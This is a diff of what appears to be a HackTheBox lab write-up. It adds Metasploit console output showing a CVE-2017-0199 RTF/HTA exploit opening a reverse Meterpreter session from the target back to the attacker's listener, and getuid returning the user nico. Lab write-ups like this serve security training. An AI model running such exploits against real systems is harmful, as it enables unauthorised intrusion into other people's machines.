@@ -290,7 +290,7 @@ Looks to be a valid email address
 
 After doing some research on RTF phishing exploits i find metasploit has a module for the associated CVE `CVE-2017-0199`
 
-# Meterpreter session
+# Meterpreter session as `nico`
 ```python
 msf exploit(windows/fileformat/office_word_hta) > options
 
@@ -355,4 +355,14 @@ msf exploit(windows/fileformat/office_word_hta) >
 [*] Sending stage (196678 bytes) to 10.129.16.113
 [*] Meterpreter session 1 opened (10.10.14.90:4444 -> 10.129.16.113:50282) at 2026-04-09 11:59:43 -0400
 ```
-Now i 
+Now i have a meterpreter session as `nico`
+
+```python
+msf exploit(windows/fileformat/office_word_hta) > sessions -i 1
+[*] Starting interaction with 1...
+
+meterpreter > getuid
+Server username: HTB\nico
+meterpreter > 
+```
+Shell as `nico`
